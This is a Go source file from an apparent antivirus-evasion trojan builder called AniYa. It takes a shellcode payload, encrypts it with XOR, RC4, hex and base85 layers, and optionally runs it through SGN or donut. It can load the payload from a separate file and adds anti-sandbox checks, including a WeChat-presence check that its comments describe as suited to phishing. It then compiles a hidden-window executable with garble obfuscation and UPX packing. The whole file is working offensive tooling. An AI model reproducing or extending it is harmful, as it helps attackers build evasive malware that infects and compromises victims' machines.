package core

import (
	"AniYa/encode"
	"AniYa/sandbox"
	"embed"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path"
	"strings"
	"syscall"
)

const (
	SANDBOX  = "sandbox"
	ENCODE   = "decode"
	TEMP_DIR = "temp"
)

type Gopt struct {
	Module            string
	Srcfile           string
	Dstfile           string
	Shellcodeencode   string
	Sgn               bool
	Donut             bool
	Fenli             bool
	Shellcodelocation string
	Antisandboxopt    Antisandboxopt
	Buildopt          Buildopt
}

type Antisandboxopt struct {
	Timestart bool `根据木马运行时间确定启动参数`
	//Stringstart    bool `根据自定义字符串确定启动参数`
	Ramcheck       bool `通过检查内存来反沙箱`
	Cpunumbercheck bool `通过检查cpu的核数来反沙箱`
	Wechatcheck    bool `检查是否存在微信来反沙箱，适合钓鱼使用`
	Disksizecheck  bool `检查硬盘大小来反沙箱`
}

type Buildopt struct {
	Garble     bool `是否使用garble进行编译`
	Upx        bool `编译之后是否使用upx进行压缩加壳，压缩效果很好`
	Literalobf bool `需配合garble使用！混淆字符串`
	Seedrandom bool `需配合garble使用！`
	Race       bool `编译时选取竞争测试，会使文件变大，也会让免杀效果变好`
	Hide       bool `隐藏黑框,会减少免杀效果`
}


//必须在该文件下放置module文件夹
//go:embed "module"
var modulefs embed.FS

var Modules = make(map[string][]byte, 8)

//通过embed将模块的loader装载进程序，不再依赖本地文件
func init() {
	n, _ := modulefs.ReadDir("module")
	println(len(n))
	for i := 0; i < len(n); i++ {
		nf, _ := n[i].Info()
		loaderfilecontent, _ := modulefs.ReadFile(path.Join("module", nf.Name(), "main.go"))
		Modules[nf.Name()] = loaderfilecontent
	}
}

//module string, shellcodencode string, sanboxopt Antisandboxopt, buildopt2 Buildopt, donut bool, srcfile string, trojan string
func Maketrojan(gopt Gopt) {
	//创建一个隐藏文件夹
	os.Mkdir(TEMP_DIR, os.ModePerm)
	namep, err := syscall.UTF16PtrFromString(TEMP_DIR)
	if err != nil {
		log.Println(err)
	}
	err = syscall.SetFileAttributes(namep, syscall.FILE_ATTRIBUTE_HIDDEN)
	if err != nil {
		log.Println(err)
	}
	//将payload放入temp文件夹下
	if gopt.Donut {
		PE2shellcode(gopt.Srcfile)
	} else {
		FileCopy(gopt.Srcfile, path.Join(TEMP_DIR, "shellcode"))
	}
	//根据选取的module将loader文件放入临时文件夹
	err = ioutil.WriteFile(path.Join(TEMP_DIR, "main.go"), Modules[gopt.Module], os.ModePerm)
	if err != nil {
		log.Println(err)
	}
	//通过时间生成的key放入临时文件夹
	//TODO:使用随机种子生成满足各种加密形式的key
	key := generatekey()
	//通过sgn混淆shellcode
	if gopt.Sgn {
		encode.Sgn(path.Join(TEMP_DIR, "shellcode"))
	}
	//加密shellcode
	encodeshellcode(gopt.Shellcodeencode, key)
	//分离加载shellcode
	if gopt.Fenli {
		addfenli(gopt.Shellcodelocation)
	}
	//添加沙箱
	addantisandbox(gopt.Antisandboxopt)
	//根据build参数生成木马
	finalbuild(gopt.Buildopt, gopt.Dstfile)
	println("build done!")
	//清理临时文件夹
	os.RemoveAll(TEMP_DIR)
}
func addfenli(location string) {
	filebefore := strings.Split(location, "\\")
	file := filebefore[len(filebefore)-1]
	println(file)
	FileCopy(path.Join(TEMP_DIR, "shellcode"), file)
	ioutil.WriteFile(path.Join(TEMP_DIR, "shellcode"), []byte(""), os.ModePerm)
	location = strings.ReplaceAll(location, "\\", "\\\\")
	fenlicode := []string{`shellcode, _ = ioutil.ReadFile("` + location + `")`, `
	"io/ioutil"
	//__IMPORT__`}
	addext(fenlicode, "fenli")
}

func encodeshellcode(shellcodencode string, key []byte) {
	var afterbytecode []byte
	beforebytecode, _ := ioutil.ReadFile(path.Join(TEMP_DIR, "shellcode"))
	switch shellcodencode {
	//xor + hex + base85
	case "xor+hex+base85":
		afterbytecode = encode.Encode1(beforebytecode, key)
		println("shellcode xor+hex+base85加密完成！")
		addext(encode.Decode1string, ENCODE)
	case "xor+rc4+hex+base85":
		afterbytecode = encode.Encode2(beforebytecode, key)
		addext(encode.Decode2string, ENCODE)
	case "rc4+hex+base85":
		afterbytecode = encode.Encode3(beforebytecode, key)
		addext(encode.Decode3string, ENCODE)
	}
	ioutil.WriteFile(path.Join(TEMP_DIR, "shellcode"), afterbytecode, os.ModePerm)
	println("laoder 添加解密代码完成！")
}

func addantisandbox(opt Antisandboxopt) {
	if opt.Timestart {
		addext(sandbox.Timestart, SANDBOX)
	}
	if opt.Ramcheck {
		addext(sandbox.Ramcheck, SANDBOX)
	}
	if opt.Cpunumbercheck {
		addext(sandbox.Cpunumber, SANDBOX)
	}
	if opt.Disksizecheck {
		addext(sandbox.Disksizecheck, SANDBOX)
	}
	if opt.Wechatcheck {
		addext(sandbox.Wechatexist, SANDBOX)
	}
	println("sandbox down!")
}

func finalbuild(buildopt2 Buildopt, dstfile string) {
	println("start build")
	if buildopt2.Garble {
		println("garble:")
		command := []string{
			"build",
			"-o",
			dstfile,
			path.Join(TEMP_DIR, "main.go"),
		}
		opt := make([]string, 0, 12)
		if buildopt2.Seedrandom {
			opt = append(opt, "-seed=random")
		}
		if buildopt2.Literalobf {
			opt = append(opt, "-literals")
		}
		opt = append(opt, command...)
		//println(len(opt))
		fmt.Printf("%v", opt)
		cmd := exec.Command("garble", opt...)
		println(cmd.String())
		if err := cmd.Run(); err != nil {
			log.Fatalln(err)
		}
	} else {
		command := []string{
			"build",
			"-o",
			dstfile,
			"-trimpath",
			"-ldflags",
			"-s -w",
		}
		if buildopt2.Hide {
			command[len(command)-1] = command[len(command)-1] + " -H windowsgui"
		}
		if buildopt2.Race {
			command = append(command, "-race")
		}
		command = append(command, path.Join(TEMP_DIR, "main.go"))
		//if buildopt2.Race && buildopt2.Hide {
		//	command[4] = "-H windowsgui -race"
		//}
		//if buildopt2.Race && !buildopt2.Hide {
		//	command[4] = "-race"
		//}
		//if !buildopt2.Race && buildopt2.Hide {
		//	command[4] = "-H windowsgui"
		//}
		cmd := exec.Command("go", command...)
		println(cmd.String())
		if err := cmd.Run(); err != nil {
			log.Fatalln(err)
		}
	}
}
